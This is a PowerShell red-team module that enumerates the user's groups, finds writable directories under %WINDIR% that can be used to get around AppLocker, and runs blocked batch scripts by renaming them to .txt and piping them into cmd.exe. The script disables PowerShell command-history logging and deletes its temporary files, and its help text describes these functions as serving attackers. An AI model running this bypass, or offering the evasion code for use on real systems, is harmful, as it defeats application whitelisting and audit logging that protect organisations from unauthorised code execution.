﻿<#
.SYNOPSIS
   1 - Enumerate ALL Group Names Available
   2 - Enumerate Directorys with weak permissions
   3 - Test AppLocker Batch Execution Restrictions bypass
   4 - Execute Batch scripts through text format bypass technic

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.3.8

.DESCRIPTION
   Applocker.ps1 module starts search recursive in %WINDIR% directory
   location for folders with weak permissions {Modify,Write,FullControl}
   that can be used to bypass system AppLocker binary execution policy Or
   to execute batch scripts converted to text format if blocked by applock!

.NOTES
   AppLocker.ps1 by Default uses 'BUILTIN\Users' Group Name to search recursive
   for directorys with 'Write' access on %WINDIR% tree. This module also allow
   users to sellect diferent GroupName(s), FolderRigths Or StartDir @arguments!

.Parameter WhoAmi
   Accepts argument: Groups (List available Group Names)

.Parameter StartDir
   The absoluct path where to start search recursive (default: %windir%)

.Parameter TestBat
   Accepts argument: TestBypass (Test bat exec bypass) Or batch absoluct path

.Parameter FolderRigths
   Accepts permissions: Modify, Write, FullControll, Execute, ReadAndExecute, etc.

.Parameter GroupName
   Accepts GroupNames: Everyone, BUILTIN\Users, NT AUTHORITY\INTERACTIVE, etc.

.EXAMPLE
   PS C:\> Get-Help .\AppLocker.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\AppLocker.ps1 -WhoAmi Groups
   Enumerate ALL Group Names Available on local machine

.EXAMPLE
   PS C:\> .\AppLocker.ps1 -TestBat TestBypass
   Test for AppLocker Batch Script Execution Restrictions

.EXAMPLE
   PS C:\> .\AppLocker.ps1 -TestBat "$Env:TMP\applock.bat"
   Execute applock.bat through text format bypass technic!

.EXAMPLE
   PS C:\> .\AppLocker.ps1 -GroupName "BUILTIN\Users" -FolderRigths "Write"
   Enum directorys owned by 'BUILTIN\Users' GroupName with 'Write' permissions

.EXAMPLE
   PS C:\> .\AppLocker.ps1 -GroupName "Everyone" -FolderRigths "FullControl"
   Enum directorys owned by 'Everyone' GroupName with 'FullControl' permissions

.EXAMPLE
   PS C:\> .\AppLocker.ps1 -GroupName "Everyone" -FolderRigths "FullControl" -StartDir "$Env:PROGRAMFILES"
   Enum directorys owned by 'Everyone' GroupName with 'FullControl' permissions starting in -StartDir [ dir ]

.INPUTS
   None. You cannot pipe objects into AppLocker.ps1

.OUTPUTS
   AppLocker - Weak Directory permissions
   --------------------------------------
   VulnId            : 1::ACL (Mitre T1222)
   FolderPath        : C:\WINDOWS\tracing
   IdentityReference : BUILTIN\Utilizadores
   FileSystemRights  : Write

   VulnId            : 2::ACL (Mitre T1222)
   FolderPath        : C:\WINDOWS\System32\Microsoft\Crypto\RSA\MachineKeys
   IdentityReference : BUILTIN\Utilizadores
   FileSystemRights  : Write
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$StartDir="$Env:WINDIR",
   [string]$FolderRigths="Write",
   [string]$GroupName="false",
   [string]$Success="false",
   [string]$TestBat="false",
   [string]$WhoAmi="false"
)

$Banner = @"

             * Reverse TCP Shell Auxiliary Powershell Module *
     _________ __________ _________ _________  o  ____      ____      
    |    _o___)   /_____/|     O   \    _o___)/ \/   /_____/   /_____ 
    |___|\____\___\%%%%%'|_________/___|%%%%%'\_/\___\_____\___\_____\   
          Author: r00t-3xp10it - SSAredTeam @2021 - Version: $CmdletVersion
            Help: powershell -File redpill.ps1 -Help Parameters

      
"@;

## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$Working_Directory = pwd|Select-Object -ExpandProperty Path
## Set default values in case user skip it
If(-not($FolderRigths) -or $FolderRigths -ieq "false"){
    $FolderRigths = "Write"
}


If($WhoAmi -ieq "Groups"){

   <#
   .SYNOPSIS
      Author: r00t-3xp10it
      Helper - Enumerate ALL Group Names Available

   .Parameter WhoAmi
      Accepts argument: Groups

   .EXAMPLE
      PS C:\> .\AppLocker.ps1 -WhoAmi Groups
      Enumerate ALL Group Names Available

   .OUTPUTS
      Group Name                               Group SID                                     Group Type
      ----------                               ---------                                     ----------
      SKYNET\pedro                             S-1-5-21-303954997-3777458861-1701234188-1001 http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid
      Todos                                    S-1-1-0                                       http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid
      NT AUTHORITY\Conta local e membro do ... S-1-5-114                                     http://schemas.xmlsoap.org/ws/2005/05/identity/claims/denyonlysid
      BUILTIN\Administradores                  S-1-5-32-544                                  http://schemas.xmlsoap.org/ws/2005/05/identity/claims/denyonlysid
      BUILTIN\Utilizadores                     S-1-5-32-545                                  http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid
      NT AUTHORITY\INTERACTIVE                 S-1-5-4                                       http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid
      INÍCIO DE SESSÃO NA CONSOLA              S-1-2-1                                       http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid
      NT AUTHORITY\Utilizadores Autenticados   S-1-5-11                                      http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid
      NT AUTHORITY\Esta organização            S-1-5-15                                      http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid
      MicrosoftAccount\pedroubuntu10@gmail.com S-1-11-96-3623454863-58364-18864-266172220... http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid
      NT AUTHORITY\Conta local                 S-1-5-113                                     http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid
      NT AUTHORITY\Autenticação da Conta em... S-1-5-64-36                                   http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid
   #>

   Write-Host ""
   ## Display available Groups
   $tableLayout = @{Expression={((New-Object System.Security.Principal.SecurityIdentifier($_.Value)).Translate([System.Security.Principal.NTAccount])).Value};Label="Group Name";Width=40},@{Expression={$_.Value};Label="Group SID";Width=45},@{Expression={$_.Type};Label="Group Type";Width=75}
   ([Security.Principal.WindowsIdentity]::GetCurrent()).Claims | FT $tableLayout
   Start-Sleep -Seconds 1;Write-Host ""
   exit ## Exit @AppLocker
}


If($TestBat -ieq "TestBypass"){

   <#
   .SYNOPSIS
      Author: r00t-3xp10it
      Helper - Test AppLocker Batch Execution Restrictions bypass

   .DESCRIPTION
      This function allow attackers to check if batch script execution its beeing blocked
      by applocker and presents to attacker the cmdline required to bypass batch execution.

   .NOTES
      This CmdLet creates $Env:TMP\logfile.txt to check the batch execution status.

   .Parameter TestBat
      Accepts argument: TestBypass

   .EXAMPLE
      PS C:\> .\AppLocker.ps1 -TestBat TestBypass
      Test for AppLocker Batch Script Execution Restrictions

   .OUTPUTS
      AppLocker – Testing for Bat execution restrictions
      --------------------------------------------------
      [i] writting applock.bat to %tmp% folder
      [i] trying to execute applock.bat script
      [x] error: failed to execute applock.bat
      [i] converting applock.bat to applock.txt
      [i] trying to execute applock.txt text file
      [+] success: execution restriction bypassed!
      [+] script output:

      Host Name:                 SKYNET
      OS Name:                   Microsoft Windows 10 Home
      OS Version:                10.0.18363 N/A Build 18363
      OS Manufacturer:           Microsoft Corporation
      OS Configuration:          Standalone Workstation
      OS Build Type:             Multiprocessor Free
      System Type:               x64-based PC

      [powershell] Bypass Instructions
      --------------------------------
      Move-Item -Path "Payload.bat" -Destination "Payload.txt" -Force
      cmd.exe "cmd.exe /K < Payload.txt"
   #>

   ## Build Output Table
   Write-Host "`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
   Write-Host "--------------------------------------------------";Start-Sleep -Seconds 1
   Write-Host "[i] writting applock.bat to %tmp% folder";Start-Sleep -Seconds 1

   echo "@echo off"|Out-File $Env:TMP\applock.bat -encoding ascii -force
   echo "systeminfo|findstr `"Host OS Type`"|findstr /V `"BIOS`" > %tmp%\logfile.txt"|Add-Content $Env:TMP\applock.bat -encoding ascii

   Write-Host "[i] trying to execute applock.bat script"
   Start-Sleep -Seconds 1;&"$Env:TMP\applock.bat"


   Clear-Host
   If(-not(Test-Path -Path "$Env:TMP\logfile.txt" -EA SilentlyContinue)){

      Write-Host "$Banner" -ForegroundColor Blue
      Write-Host "`n`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
      Write-Host "--------------------------------------------------"
      Write-Host "[i] writting applock.bat to %tmp% folder"
      Write-Host "[i] trying to execute applock.bat script"
      Write-Host "[x] error: failed to execute applock.bat" -ForegroundColor Red -BackgroundColor Black

      Write-Host "[i] converting applock.bat to applock.txt";Start-Sleep -Seconds 1
      Move-Item -Path "$Env:TMP\applock.bat" -Destination "$Env:TMP\applock.txt" -EA SilentlyContinue -Force

      Write-Host "[i] trying to execute applock.txt text file`n"
      ## Nice trick to be abble to execute cmd stdin { < } on PS
      Start-Sleep -Seconds 1;cmd.exe /c "cmd.exe /K < %tmp%\applock.txt"

      Clear-Host
      If(-not(Test-Path -Path "$Env:TMP\logfile.txt" -EA SilentlyContinue)){

         Clear-Host
         Write-Host "$Banner" -ForegroundColor Blue
         Write-Host "`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
         Write-Host "--------------------------------------------------"
         Write-Host "[i] writting applock.bat to %tmp% folder"
         Write-Host "[i] trying to execute applock.bat script"
         Write-Host "[x] error: failed to execute applock.bat" -ForegroundColor Red -BackgroundColor Black
         Write-Host "[i] converting applock.bat to applock.txt"
         Write-Host "[i] trying to execute applock.txt text file";Start-Sleep -Seconds 2
         Write-Host "[x] Fail: To bypass Batch AppLocker restrictions!`n" -ForegroundColor Red -BackgroundColor Black

      }Else{

         Clear-Host
         Write-Host "$Banner" -ForegroundColor Blue
         Write-Host "`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
         Write-Host "--------------------------------------------------"
         Write-Host "[i] writting applock.bat to %tmp% folder"
         Write-Host "[i] trying to execute applock.bat script"
         Write-Host "[x] error: failed to execute applock.bat" -ForegroundColor Red -BackgroundColor Black
         Write-Host "[i] converting applock.bat to applock.txt"
         Write-Host "[i] trying to execute applock.txt text file";Start-Sleep -Seconds 2
         Write-Host "[+] success: execution restriction bypassed!" -ForegroundColor Green
         Write-Host "[+] script output:`n"
         Start-Sleep -Seconds 1
         Get-Content -Path "$Env:TMP\logfile.txt"
         Write-Host "`n[powershell] Bypass Instructions" -ForegroundColor Green
         Write-Host "--------------------------------"
         Write-Host "Move-Item -Path `"Payload.bat`" -Destination `"Payload.txt`" -Force"
         Write-Host "cmd.exe `"cmd.exe /K < Payload.txt`"`n"

      }

   }Else{

      Clear-Host
      Write-Host "$Banner" -ForegroundColor Blue
      Write-Host "`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
      Write-Host "--------------------------------------------------"
      Write-Host "[i] writting applock.bat to %tmp% folder"
      Write-Host "[i] trying to execute applock.bat script"
      Write-Host "[+] success: executed! none restrictions found!" -ForeGroundColor Green
      Write-Host "[+] script output:`n"
      Get-Content -Path "$Env:TMP\logfile.txt"
   }

   ## Delete ALL artifacts left behind
   Remove-Item -Path "$Env:TMP\applock.bat" -EA SilentlyContinue -Force
   Remove-Item -Path "$Env:TMP\applock.txt" -EA SilentlyContinue -Force
   Remove-Item -Path "$Env:TMP\logfile.txt" -EA SilentlyContinue -Force
   Write-Host "";exit ## Exit @AppLocker
}


If($TestBat -Match '\\'){

   <#
   .SYNOPSIS
      Author: r00t-3xp10it
      Helper - Execute Batch scripts through text format bypass technic

   .DESCRIPTION
      This function allow attackers to execute batch files bypassing applocker

   .Parameter TestBat
      Accepts the batch script absoluct \ relative path

   .EXAMPLE
      PS C:\> .\AppLocker.ps1 -TestBat "$Env:TMP\applocker.bat"
      Execute applock.bat through text format bypass technic.

   .OUTPUTS
      AppLocker – Executing applock.bat script
      ----------------------------------------
      [+] found: C:\Users\pedro\Coding\applock.bat
      [i] converting applock.bat to applock.txt
      [i] trying to execute applock.txt text file
      [+] script output :

      Microsoft Windows [Version 10.0.18363.1440]
      (c) 2019 Microsoft Corporation. Todos os direitos reservados.

      C:\Users\pedro\Coding>@echo off
      systeminfo|findstr "Host OS Type"|findstr /V "BIOS"
      Host Name:                 SKYNET
      OS Name:                   Microsoft Windows 10 Home
      OS Version:                10.0.18363 N/A Build 18363
      OS Manufacturer:           Microsoft Corporation
      OS Configuration:          Standalone Workstation
      OS Build Type:             Multiprocessor Free
      System Type:               x64-based PC

   #>

   ## Local function variable declarations
   # User Input: $TestBat = "$Env:USERPROFILE\Coding\applock.bat"
   $RawName = $TestBat.Split('\')[-1]             ## applock.bat
   $Bypassext = $RawName -replace 'bat','txt'     ## applock.txt
   $RawFullPath = $TestBat -replace 'bat','txt'   ## C:\Users\pedro\Coding\applock.txt
   $StripPath = $TestBat -replace "\\$RawName","" ## C:\Users\pedro\Coding

   ## Build Output Table
   Write-Host "`n`nAppLocker – Executing $RawName script" -ForegroundColor Green
   Write-Host "----------------------------------------";Start-Sleep -Seconds 1
   ## Make sure the user input file exists
   If(Test-Path -Path "$TestBat" -EA SilentlyContinue){
      Write-Host "[+] found: $TestBat";Start-Sleep -Seconds 1
   }Else{## User Input File NOT found!
      Write-Host "[error] not found: $TestBat`n`n" -ForegroundColor Red -BackgroundColor Black
      exit ## Exit @AppLocker
   }

   Write-Host "[i] converting $RawName to $Bypassext";Start-Sleep -Seconds 1
   Copy-Item -Path "$TestBat" -Destination "$RawFullPath" -EA SilentlyContinue -Force

   cd $StripPath
   Write-Host "[i] trying to execute $Bypassext text file" -ForeGroundColor Yellow
   Start-Sleep -Seconds 1;Write-Host "[+] script output:`n`n"
   ## Nice trick to be abble to execute cmd stdin { < } on PS
   Start-Sleep -Seconds 1;cmd.exe /c "cmd.exe /K < $Bypassext"
   cd $Working_Directory ## return to applocker working directory

Write-Host ""
exit ## Exit @AppLocker
}


If($GroupName -ieq "false"){
    ## Get Group Name (BUILTIN\users) in diferent languages
    # England, Portugal, France, Germany, Indonesia, Holland, Italiano, Romania, Croacia, Bosnia
    # Checkoslovaquia, Denmark, Spanish, Ireland, Iceland, Luxemburg, servia, Ucrain, swedish.
    $FindGroupUser = whoami /groups|findstr /C:"BUILTIN\Users" /C:"BUILTIN\Utilizadores" /C:"BUILTIN\Utilisateurs" /C:"BUILTIN\Benutzer" /C:"BUILTIN\Pengguna" /C:"BUILTIN\Gebruikers" /C:"BUILTIN\Utenti" /C:"BUILTIN\Utilizatori" /C:"BUILTIN\Korisnici" /C:"BUILTIN\Uživatelů" /C:"BUILTIN\Brugere" /C:"BUILTIN\Usuarios" /C:"BUILTIN\Úsáideoirí" /C:"BUILTIN\Notendur" /C:"BUILTIN\Benotzer" /C:"BUILTIN\Kорисника" /C:"користувачів" /C:"BUILTIN\Användare"|Select-Object -First 1
    $SplitStringUser = $FindGroupUser -split(" ");$GroupName = $SplitStringUser[0] -replace ' ','' -replace '\\','\\'
}ElseIf($GroupName -ieq "$Env:USERNAME" -or $GroupName -ieq "$Env:COMPUTERNAME"){
    $GroupName = "${Env:COMPUTERNAME}\${Env:USERNAME}" -replace '\\','\\' ## Uses Domain\user groupname if selected 'username' or 'domainname'
}ElseIf($GroupName -Match '\\'){
    $GroupName = $GroupName -replace '\\','\\'
}Else{
    $GroupName = $GroupName ## Everyone
}


## Build Output Table
$mytable = New-Object System.Data.DataTable
$mytable.Columns.Add("Id")|Out-Null
$mytable.Columns.Add("DirectoryRights")|Out-Null
$mytable.Columns.Add("VulnerableDirectory")|Out-Null
Write-Host ""
Write-Host "FileSystemRights  : $FolderRigths" -ForegroundColor Yellow
Write-Host "IdentityReference : $GroupName"
Write-Host "StartDirectory    : $StartDir`n"
Write-Host "AppLocker - Weak Directory permissions" -ForegroundColor Green
Write-Host "--------------------------------------"
Start-Sleep -Seconds 1


[int]$Count = 0
$Success = $False
## Search recursive for directorys with weak permissions!
$dAtAbAsEList = (Get-childItem -Path "$StartDir" -Recurse -Force -EA SilentlyContinue | Where-Object { $_.PSIsContainer }).FullName
ForEach($Token in $dAtAbAsEList){## Loop truth Get-ChildItem Items (StoredPaths)

    try{

       ## Get each stored directory ($dAtAbAsEList) ACL's
       $CleanOutput = (Get-Acl "$Token" -EA SilentlyContinue).Access | Where-Object { 
          $_.FileSystemRights -Match "$FolderRigths" -and $_.IdentityReference -Match "$GroupName" 
       }

       If($CleanOutput){$Count++ ##  Write the Table 'IF' found any vulnerable permissions
          Write-Host "`nVulnId            : ${Count}::ACL (Mitre T1222)"
          Write-Host "FolderPath        : $Token" -ForegroundColor Green
          Write-Host "IdentityReference : $GroupName"
          Write-Host "FileSystemRights  : $FolderRigths`n"
          $mytable.Rows.Add("$Count","$FolderRigths","$Token")|Out-Null ## <-- Add Full Path to output database
          $Success = $True
       }

    }Catch{## Print dir(s) that does not meet the search criteria!
       Write-host "FolderPath        : $Token"
    }## End of Try{} loop

}## End of ForEach() loop


If($Success -ne $True){
    Write-Host "`n`n[error] None dir Owned by '$GroupName' found with '$FolderRigths' permissions!" -ForegroundColor Red -BackgroundColor Black
}Else{## Display Output Data Table
    $mytable|Format-Table -AutoSize
}
Write-Host ""
